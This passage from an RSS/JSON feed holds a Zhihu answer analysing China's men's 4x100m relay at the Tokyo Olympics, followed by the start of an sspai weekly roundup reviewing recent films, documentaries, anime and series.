14:33:35","description":"\n<p>汤星强起跑足够出色、谢震业顺利过渡、苏炳添疯狂的追赶、吴智强全程力压牙买加守住优势——37秒79，追平国家纪录（2019年多哈世锦赛，苏炳添/许周政/吴智强/谢震业）！</p>\n<p>与上一届里约奥运会一样，还是决赛第四——甚至跑赢了牙买加！</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"最后一棒的交接，有点可惜了，本来可以更好的。吴的启动节奏啊……\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-cc12df8436067a80b7aa7c4bfaa1497b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1730\" data-rawheight=\"662\" data-watermark=\"watermark\" data-original-src=\"v2-cc12df8436067a80b7aa7c4bfaa1497b\" data-watermark-src=\"v2-027efbc8a13cc7bb9489ed8507691e6d\" data-private-watermark-src=\"v2-bf556e669c6d50037239aab16e008b6e\"></p>\n<p><br></p>\n<p>意大利田径队是今夏东京田径赛场上最大的黑马，中国田径队是中国代表队里最让人欣喜的队伍——哪怕他/她们的目标都只是进入决赛、争取名次。</p>\n<p>这些无奖牌的王者，真的是中国体育的骄傲。</p>\n<p><br></p>\n<hr>\n<p>4x100米可以说的点太多了，往详细了说——</p>\n<p><br></p>\n<p>「奥运会是国与国之间无硝烟的战争」这句话让顾拜旦（现代奥运会主要倡导者）听到，估计会气的七窍生烟。但说4x100米接力项目，是国与国之间最强速度的PK，这个描述问题就不大——100米/200米项目都是个体天才间的pk，4x100米这样的接力，就完美体现了最强的速度、最高的默契、最完美的/零容忍的技术要求。</p>\n<p>可能是整届奥运会最紧张刺激的项目（之一）。</p>\n<p><br></p>\n<p><b>25岁的汤星强、27岁的谢震业、32岁的苏炳添、27岁的吴智强，他们代表的中国速度，真的完全不亚于中国其他领域的速度。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1d7c0c20cf2a6f9527ec4580153ae127_720w.jpg?rss\" data-caption=\"预赛小组第一\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-1d7c0c20cf2a6f9527ec4580153ae127\" data-watermark-src=\"v2-e0e1adfea571518903404993c7867568\" data-private-watermark-src=\"v2-9e01dfefb3e5355ab1ac4a6116c6fa05\"></p>\n<h2>\n<br>预赛回顾：超神的小组第一，力压美加意等短跑强国</h2>\n<p><br></p>\n<p>预赛两组。</p>\n<p>第一组牙买加、英国、日本、特立尼达和多巴哥、法国、南非都算是有进入决赛实力的。最终牙买加（37秒82）、英国（38秒02）、日本（38秒16）晋级；</p>\n<p>我们在第二组，<b>汤星强、谢震业、苏炳添、吴智强跑出37秒92，力压加拿大、意大利等强队，第二组排名第一晋级决赛。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9a492c2ad3130c85c9c41014d99bef4f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-9a492c2ad3130c85c9c41014d99bef4f\" data-watermark-src=\"v2-8c663fbabc3df4c1e2df077364365a2c\" data-private-watermark-src=\"v2-5816b498fe42b8087d1814e926432d43\"></p>\n<p><br></p>\n<p>预赛中国队发挥并不算完美，交接棒的一些衔接细节可以做得更好些。</p>\n<p><b>但37秒92本赛季最佳、小组第一晋级的结果，完全不需要吹毛求疵了——汤星强的起跑足够给力、谢震业守住了领先优势、第三棒苏炳添的表现天神下凡生生创造出距离差、而最后一棒吴智强也完全没让加拿大的迫近变成逆转。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-dc1c5483289690ec3852afd8b96a2634_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"460\" data-watermark=\"watermark\" data-original-src=\"v2-dc1c5483289690ec3852afd8b96a2634\" data-watermark-src=\"v2-c74d92a122e191c35f696a0b59d26e4b\" data-private-watermark-src=\"v2-696695d33ae6f77dce93d3fd78229b62\"></p>\n<p><br></p>\n<p>美国出人意料的小组第六（38秒10）、以0.02秒的微弱劣势没能晋级决赛——赛后网上那个小视频估计大家都看到了。<b>苏神问谢震业美国队情况，小谢抿着水摇着手指、一脸坏笑说，“（美国队）没进（决赛），小组第六！”</b></p>\n<p>淘气。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9107901260c9fc86bbca5af8051820d8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2858\" data-rawheight=\"1558\" data-watermark=\"watermark\" data-original-src=\"v2-9107901260c9fc86bbca5af8051820d8\" data-watermark-src=\"v2-93d72687e8eddada5575da9c8fd1894b\" data-private-watermark-src=\"v2-d204d799e6a8348a1fddd0d3cdebc4d8\"></p>\n<p><br></p>\n<p>特别提一下美国队。</p>\n<p>美国的短跑和4x100接力队，自古以来（从1912年奥运设项来）都是全世界第一档的水准——<b>奥运会4x100一共25次（男子）比赛，美国拿了15次冠军、2次亚军。</b></p>\n<p>一度是碾压式的短跑接力梦之队。</p>\n<p>但牙买加崛起后，美国在短跑上就陷入特别尴尬的境地，屡战屡败。上一次拿到金牌已经是悉尼奥运会、过去20多年了。</p>\n<p>2019年多哈世锦赛美国队非常强势夺冠，当时老美全国都有一种被牙买加压迫了那么多年、翻身农奴把歌唱的喜悦。结果东京奥运会科尔曼禁赛、贾斯汀老去，今年短跑美国又表现的很萎靡。</p>\n<p>接力尤其拉胯。</p>\n<p><br></p>\n<p><b>不夸张的说，中国这几年不见得4x100就完全不敢/不该和美国比，相反我们有些年轻人冒起来——这篇内容最后会提到——我们是完全可以掰一掰手腕的。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e0153436b3795cfbf0389763434d0540_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-e0153436b3795cfbf0389763434d0540\" data-watermark-src=\"v2-3a14f9697e583b4154e5ecfb73997e16\" data-private-watermark-src=\"v2-3ecb1c7ff446b38b44c440e5d9607a7e\"></p>\n<p><br></p>\n<p>就事论事，再多说一下预赛的分组。</p>\n<p>之前接力分组出来后，有声音说日本把自己分在弱组，把中国放进死亡组。这种争议有点没有必要。</p>\n<p>一来日本自身不弱，二来接力谈不上多少能放水的（除非最后一棒大幅领先），和强队一组反而能跑得更快，且日本那组真的不弱。就算拿不到前三也能靠更快成绩进决赛。</p>\n<p><br></p>\n<p>这样进入决赛的八支接力队，按半决赛成绩依次是，牙买加、中国、加拿大、意大利、英国、德国、加纳、日本。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2e702ed1f0628514393a7200b2a488cf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1656\" data-rawheight=\"656\" data-watermark=\"watermark\" data-original-src=\"v2-2e702ed1f0628514393a7200b2a488cf\" data-watermark-src=\"v2-6c7690b425761c5d28e1aca802f1f203\" data-private-watermark-src=\"v2-38ae798a7e3ae668d3a91093f2ddb3f4\"></p>\n<p><br></p>\n<h2>决赛：再次第四，追平国家纪录！</h2>\n<p>中国第七道。</p>\n<p>第七道是不错的道次，两边一个是接力老牌强队英国，一个是今年让人刮目相看的意大利（横空出世，确实很多人都没想到）。小日本最外道。</p>\n<p>汤星强、谢震业、苏炳添、吴智强，四人出场的亮相是小悟空爆气的动作。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a3ae3c0efb10e325d01dcd7752e6f366_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"337\" data-watermark=\"watermark\" data-original-src=\"v2-a3ae3c0efb10e325d01dcd7752e6f366\" data-watermark-src=\"v2-c287f38bb92511f344319424efa2211f\" data-private-watermark-src=\"v2-e203a5710cd66aaa1765cae0c42d199f\"></p>\n<p><br></p>\n<p>比赛开始。</p>\n<p>汤星强0.153秒起跑反应，位列第5。从起跑到加速这一段相比其它选手没有什么优势（毕竟决赛第一道就没弱的），不过<b>在完成加速-进入最高速度时，维持极速相当不错。交接棒之前缩小了一些和洛伦佐（意大利）的差距</b>；</p>\n<p>第二棒给到谢震业后，小谢的过渡也是相当顺利的。而老对手日本队，可能过于兴奋/紧张，居然掉棒了……</p>\n<p>第三棒的苏炳添，自然是最强的 （<a href=\"https://www.zhihu.com/question/296458587/answer/508135456\" class=\"internal\">为什么苏炳添4*100米跑第三棒弯道？</a> ）。<b>苏炳添在英国队的外道，和同是老将的理查德·基尔蒂直接PK，死死咬住，几乎抹平了差距</b>；</p>\n<p>最后一棒吴智强是<b>惋惜后的惊喜</b>。</p>\n<p><b>吴智强的启动有点儿可惜，交接棒的启动节奏早了……甚至可能感觉出苏炳添的一丝懊恼。本来3-4棒交接这段，中国完全有可能追平英国、微超意大利。</b></p>\n<p><b>但这种可惜很快又变成一种惊喜，吴智强死死的压住了奥布利克·塞维尔（20岁的小将，百米尚未跑进10秒），将这种微弱领先保持住了。</b></p>\n<p><br></p>\n<p>意大利（菲利帕）和英国（米切尔·布莱克）的冲刺相当优秀，也决定了最终的名次。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><br></p>\n<p><b>汤星强起跑足够出色、谢震业顺利过渡、苏炳添疯狂的追赶、吴智强有小失误不过后面全程力压牙买加——37秒79，追平国家纪录</b>（2019年多哈世锦赛，苏炳添/许周政/吴智强/谢震业）！</p>\n<p>与上一届里约奥运会一样，还是<b>决赛第四</b>——甚至跑赢了牙买加（0.05秒）！</p>\n<p>只落后铜牌加拿大0.09秒，加拿大的个体实力很高，交接棒技术只能算一般。而交接棒技术一直是世界最佳的日本和牙买加，今天却纷纷表现的非常业余。</p>\n<p><br></p>\n<p>中国队的表现，则真的相当出色。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d722048f4604475aef1050167d39e5bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-d722048f4604475aef1050167d39e5bc\" data-watermark-src=\"v2-7aeffd36c220ae50780d0d19b348b859\" data-private-watermark-src=\"v2-5753474e589fdf5b0db175f5aa766aa9\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-24b15adc47f6843c25336f7f79d3671f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-24b15adc47f6843c25336f7f79d3671f\" data-watermark-src=\"v2-49c4619611736d0b0343eaa0480c1741\" data-private-watermark-src=\"v2-d7b09e5140b397722702f5877c6bf862\"></p>\n<h2>\n<br>中国短跑接力队的昨天、今天和明天</h2>\n<p>太远古时期不提。<b>近年中国短跑和短跑接力兴起，也就是11、12年左右的事，正好十年前苏炳添、张培萌这一代起来。</b></p>\n<p>中国田径队前总教练冯树勇几年前说过一段话，大意是<b>中国接力队此前从上到下都“干劲不足”，大家抱着“人人弱则团体更弱”的心态。结果隔壁日本起了好榜样，4个百米都没破过十的选手，接力队却能和欧美扳手腕，于是从近邻身上得到信心，才有了后面几年可圈可点的成绩。</b></p>\n<p><br></p>\n<p>感兴趣可以看看这个回答，提到不少以前几支接力队：</p>\n<a href=\"https://www.zhihu.com/question/296458587/answer/508135456\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-0d638eaf077707b53a0867e157bc41fd_bh.jpg\" data-image-width=\"2252\" data-image-height=\"836\" class=\"internal\">4x100米接力，为什么苏炳添会跑第三棒弯道？</a><p><br></p>\n<p>2016年，苏炳添接受采访时曾提到这样一句话，“<b>希望中国能多出几个百米跑到10秒20的年轻选手，这样中国接力队才能继续保持竞争力。</b>”当时铁打的最后一棒张培萌已近退役，苏炳添自己也快30。</p>\n<p>2015年北京世锦赛拿到银牌后，很多人就已经担心那支中国接力队已达到上限、很怕后继无人。</p>\n<p>然而这两年中国短跑很神奇的涌现出一大批很值得期待的年轻人。比如“00后”的<b>陈冠锋</b>（10秒06）、<b>何宇鸿</b>（10秒18）、<b>黄永炼</b>（10秒31）、<b>严海滨</b>（10秒22），以及禤达军、王智弘、陈程、李文杰……</p>\n<p><br></p>\n<p>其中比如严海滨，是2003年出生的小将，今年东京奥运会已经是接力队的替补了（这小伙100和200米都有很强竞争力）。还有今年屡次刷新个人最快的陈冠锋、去年刷新34年历史全国青年百米纪录的何宇鸿，<b>不少都已经比苏炳添们同龄时期表现的更为出色</b>。</p>\n<p>后生可畏。</p>\n<p>记住这些年轻的名字吧。</p>\n<p><b>兴许以他们的年龄和实力，在东京奥运会周期还无法挑大梁，不过明年的亚运会和世锦赛、包括三年后的巴黎奥运会，他们兴许就能慢慢接过苏炳添的旗帜。</b></p>\n<p>毕竟届时苏神已经35岁了。</p>\n<p>再加上梁劲生等依然还在当打年的“老将”（很可惜，今年4月底梁劲生拉伤，不然东京很有可能看到他），<b>中国接力队未来几年完全具备成为世界强队的可能。</b></p>\n<p><br></p>\n<p>至于这个上限是多少，比较现实的，</p>\n<ul>\n<li>稳定发挥确保进入决赛、赢下与老对手日本队「亚洲一哥」的较量、冲击前五甚至领奖台的名次；</li>\n<li>用交接棒的技术默契度弥补个体上的差异，用完善的青少年田径梯队人才去抗衡日本卡塔尔等存在的归化/混血军团（比如日本之前的萨尼·布朗）；</li>\n<li>也别像美国、特立尼达和多巴哥们一样，经常动不动交接棒环节拉胯、用低级失误白白浪费天赋；</li>\n</ul>\n<p><br></p>\n<p>另外最近20年，牙买加、美国、英国等接力强队都在药物问题上出现过问题，有隔了快十年成绩被作废、奖牌回收的黑历史——干干净净的跑，干干净净的赢。起码现在看，中国短跑国家队在这点上做得挺不错的。</p>\n<p><br></p>\n<p>继续加油，中国接力队！</p>\n<p>（通篇提的都是中国短跑接力男队，后面有时间再说说女队，同样是好样的）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-90a3e13851db76792d718804d9adee7f_720w.jpg?rss\" data-caption=\"最后一棒吴智强有遗憾有惊喜\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-90a3e13851db76792d718804d9adee7f\" data-watermark-src=\"v2-7d486b756e0ad33bd077e2037ebb5f47\" data-private-watermark-src=\"v2-c48799b733b3417771b12b432ba9b796\"></p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476493978/answer/2032949449\" class=\"internal\">2020 东京奥运跳水女子 3 米跳板决赛施廷懋、王涵包揽冠亚军，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476149568/answer/2029677017\" class=\"internal\">2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n</ul>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477844835/answer/2043691123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">361 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/476382083?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运田径女子组100米决赛？</a><br><a href=\"http://www.zhihu.com/question/476457735?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会女子 4x100 米混合泳接力决赛中国队获第 4 ？</a><br>\n","link":"http://www.zhihu.com/question/477844835/answer/2043691123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"本周看什么丨最近值得一看的 7 部作品","date":"2021-08-06 10:11:59","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[电影] 怒火·重案、[纪录片] 柴米油盐之上、[动画] 异世界迷宫黑心企业、[电影] 智齿、[冰岛剧] 卡特拉火山、[综艺] 再见爱人、[韩剧] 远看是蔚蓝的春天</li>\n<li>几则精彩预告：漫威漫改超级英雄电影《毒液2》发新正式预告、《纸钞屋》第五季（最终季）正式中字预告片释出、热播日剧《女子警察的逆袭》原作宣布改编为 TV 动画、克林特·伊斯特伍德自导自演新片《哭泣的男人》预告、DC 漫改剧集《Y 染色体》9 月 13 日开播</li>\n<li>几则影视资讯：由罗素兄弟执导的豪华阵容动作惊悚片《灰人》宣布杀青、亚马逊剧版《指环王》发布剧照，定档：明年 9 月 2 日、《名侦探柯南 警察学校篇》将改编为 TV 动画、《数码宝贝》将推出新作 TV<strong> </strong>动画和动画电影</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[电影] 怒火·重案</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/ccdf0879283446d52a5698e6f4b2cec2\"></figure><p>关键词：动作 / 犯罪</p>\n<p>片长：128 分钟</p>\n<p>观看渠道：院线上映中；<a href=\"https://movie.douban.com/subject/30174085/\">豆瓣链接</a></p>\n<blockquote><p>黑白双雄，港风再来！</p></blockquote>\n<p>@潘誉晗：故事讲述重案组督察张崇邦是一个极具正义感的警察，也正是因为这份正义感让他受到了上司的阻挠，无法及时参与某次围剿毒枭的行动，但令人没有想到的是，这一次的行动是一个「黑吃黑」的阴谋，众多兄弟罹难让他悲痛万分，下定决心要抓住真凶的他没有想到，幕后组织这一切的竟是昔日的同侪邱刚敖。</p>\n<p>作为导演陈木胜的遗作，这是一部非常不错的动作片，也可以说是近几年在电影院里看到过的动作戏最扎实的港片。影片中那种拳拳到肉，刀刀见血，一言不合就掏枪的刺激感让我整个人肾上腺素飙升。甄子丹的动作戏毋庸置疑，好久没有新戏的谢霆锋也令人相当惊艳，仿佛是把这几年积累的能量一下子都爆发了，把一个因为觉得自己被背叛然后复仇的疯子形象演绎得非常到位。片中摩托车和小轿车的追逐戏特别精彩，最后半小时港片中常见的黑白双雄巅峰对决也是一点都不拖泥带水，所以并不会因为设定略微老套而觉得乏味，推荐有时间的小伙伴都去大荧幕感受一下。</p>\n<h3>[纪录片] 柴米油盐之上</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/0857bf2e11699a22c29704d873256679.png\"></figure><p>关键词：纪录片</p>\n<p>片长：35 分钟（单集）× 4 集；<a href=\"https://movie.douban.com/subject/35516588/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：本片导演是两届奥斯卡奖获得者、英国导演柯文思，片中，他将镜头对准平凡人物，忠实记录一个个追寻美好生活的普通中国人的故事，他们是中国变革故事的亲历者，也是创造者，他们靠自己的辛勤和智慧，改变了自己的生活，也参与到这场巨大的变革中来。</p>\n<p>虽然这是一部主旋律纪录片，但柯文思以相对中立的西方视角与饱含温度的镜头还原了普通中国百姓的故事——基层扶贫的开勇支书、坚强踏实的卡车司机琳宝、杂技明星王怀甫和快递行业的亿万富翁，既没有歌功颂德，也没有放大矛盾。导演试图去理解中国人难以离开故土和即使走出家乡后依旧怀有的眷恋，无论在何处打拼，故乡永远是每个中国人心里充满柔情的一隅，无论在何处生活，都牢牢记着养育自己的这一方水土，也有无数的人在有能力以后，力所能及地回馈自己的家乡，像常开勇回到基层，一边对家人充满愧疚，一边承担起为家乡摆脱贫困的艰巨任务；像琳宝，离开这个 6000 块卖掉她的地方，但仍记挂着父母儿子，努力打拼，期望将他们也接出来一起生活；像怀甫俨然已经摆脱贫困过上了小康生活，依旧带儿子回到家乡忆苦思甜，又如子胥村当年的砍柴少年们，在成为成功商人后回来反哺家乡。故事串联得像电影一样精彩，本片也向世界展现了可信、可敬、可爱的中国人！</p>\n<h3>[动画] 异世界迷宫黑心企业</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/e3ebb6f9ccf1042aab63656fce692273.png\"></figure><p>关键词：漫画改 / 剧情 / 奇幻 / 搞笑</p>\n<p>片长：24 分钟（单集）× 12 集，每周五更新</p>\n<p>观看渠道：<a href=\"https://www.amazon.co.jp/dp/B098WTK5RM/\">Amazon Prime Video</a> / <a href=\"https://www.bilibili.com/bangumi/media/md28234626/\">哔哩哔哩</a>（有删改）；<a href=\"https://movie.douban.com/subject/35128773/\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://magcomi.com/episode/10834108156766291310\">MAGCOMI</a> / <a href=\"https://manga.bilibili.com/detail/mc30007\">哔哩哔哩漫画</a>（有删改）</p>\n<blockquote><p>全异世界无产生物，联合起来！</p></blockquote>\n<p>@SHY：二之宫金治出生于现代日本，为对抗资本主义社会对人的异化，获取足够的生产资料后，便「躺平」家中，不事劳作。所谓天将降大任于斯人也，时代的洪流将他带到了异世界，此地正处于资本的原始积累阶段，工业革命改变了旧有的迷宫探索方式，巨型公司取代冒险者工会，在利益驱使下向更深处进发。沦落成其中一家企业底层「社畜」的二之宫，面对恶劣的工作环境、长时间的超负荷劳动与极其微薄的薪水，决定揭竿而起。他集结志同道合的伙伴，传授先进理念，打劳工权益牌，组织群众运动，为推翻黑心到家的公司，夺回愉快的家里蹲生活而奋斗。</p>\n<p>以上梗概绝无虚假，只有一点小问题：标题中的「迷宫黑心企业」是二之宫同志反抗组织的名字，他本人更是工贼代表，往上爬只为自己享福，却又在关键时刻闪烁着人性的光辉——然后加倍赚回来。在一水儿经不起考据的伪中世纪欧洲异世界中，原作称得上现实主义巨著，剖析并批判了职场中的常见陷阱，从公司养活员工、年轻就要打拼的毒鸡汤 PUA 话术到合同隐藏条款、不实广告宣传的具体商业决策，相信能引发不少观众共鸣。虽然改编动画的经费不怎么宽裕，但有原著打底，银链的发挥仍在水准线上，剧情删改详略得当，笑点密集又发人深省，从同类题材中脱颖而出。</p>\n<h3>[电影] 智齿</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/43e5d02b7d32deb8a65eb21c9bf22bd3\"></figure><p>关键词：悬疑 / 犯罪</p>\n<p>片长：118 分钟；<a href=\"https://movie.douban.com/subject/27124695/\">豆瓣链接</a></p>\n<blockquote><p>一部风非常格化、作者向的港片。</p></blockquote>\n<p>@甜約翰： 《智齿》改编自雷米的同名短篇小说，由郑保瑞执导，故事围绕一宗连环凶杀案展开。</p>\n<p>影片聚焦罪犯、吸毒者、援交女、拾荒者、非法移民等边缘人群展开叙事，杂糅了压抑、暴力、混乱、暗黑、血腥、失控等多种情绪，全片以黑白画面呈现，视觉风格和氛围营造一流，并呈现出一种「末世感」的电影气质。影片中关于「宿命论」的表达仿佛让我们又看到了那个以「黑」「狠」「冷」著称的银河映像。但是，影片的文本实在是有些弱，以致在叙事的流畅度上大打折扣。</p>\n<p>相较于中文片名《智齿》，英文片名《Limbo》或许更能体现影片的内核。《智齿》不仅让导演郑保瑞回归了自己擅长的犯罪题材类型片，其制作班底也相当豪华，叶伟信和黄柏高担任制片，编剧是欧健儿，美术设计是麦国强，都是银河映象的「老手」，此外，川井宪次的配乐也非常加分。演员方面，林家栋稳定输出，李淳虽然不出彩，但也不至于拉垮，倒是刘雅瑟的表现十分亮眼，值得一座影后奖杯。推荐这部电影给喜欢港片的朋友们。</p>\n<h3>[冰岛剧] 卡特拉火山</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/bcbbb86ae31884e97784da02742b1981\"></figure><p>关键词：剧情 / 科幻 / 悬疑</p>\n<p>片长：45 分钟（单集）× 8 集</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/81133094\">Netflix</a>；<a href=\"https://movie.douban.com/subject/34853059/\">豆瓣链接</a></p>\n<blockquote><p>卡特拉火山，是会吞食人类的。</p></blockquote>\n<p>@潘誉晗：这次网飞的新剧以现实中真实存在的冰岛火山卡特拉火山为线索，讲述在大爆发一年之后，火山附近的维克小镇发生了令人意想不到的诡异事件——那些曾经去世的人竟然一个一个都复活了！而当他们被发现的时候，身上总是被火山灰所覆盖。这到底是因为火山爆发所释放出的远古神秘元素在作祟，还是如当地的传说一样，是因为「卡特拉火山会吞食人类。」</p>\n<p>虽然这部新出的冰岛悬疑剧在国内的关注并不高，在豆瓣也只有不到四百人的评价，但在烂番茄，《卡特拉火山》不仅连续上榜「最受欢迎剧集」的榜单，而且也得到了 100% 的新鲜度。超自然现象的设定，缓缓道来的叙事方式，加上冰冷、神秘的叙事背景，都让人身临其境般地感受那个神秘的维克小镇。那些死而复生的人，被裹挟在黑色的躯壳下，洗净完毕露出干净的脸庞和清澈的双眼，看着一个个曾经熟悉的人一脸震惊，这一切的真相究竟是什么呢？</p>\n<h3>[综艺] 再见爱人</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/e6be01a5cbedd686aa6b90513c8e349c\"></figure><p>关键词：爱情 / 真人秀</p>\n<p>片长：70 分钟（单集）× 13 集；<a 